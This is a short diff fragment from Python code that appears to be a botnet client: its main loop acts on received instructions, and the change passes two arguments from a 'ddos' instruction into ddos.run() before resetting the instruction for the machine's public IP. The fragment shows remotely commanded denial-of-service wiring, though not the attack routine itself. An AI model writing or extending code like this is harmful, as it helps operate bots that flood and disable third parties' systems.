@@ -92,8 +92,8 @@ def main(start_module):
 
             elif result[0] == "ddos":
                 if len(result) >= 3:
-                    ddos.run()
-
+                    ddos.run(result[1], result[2])
+                    
             if result != "no_data":
                 instructions.reset_instruction(PUBLIC_IP)
         elif not result:
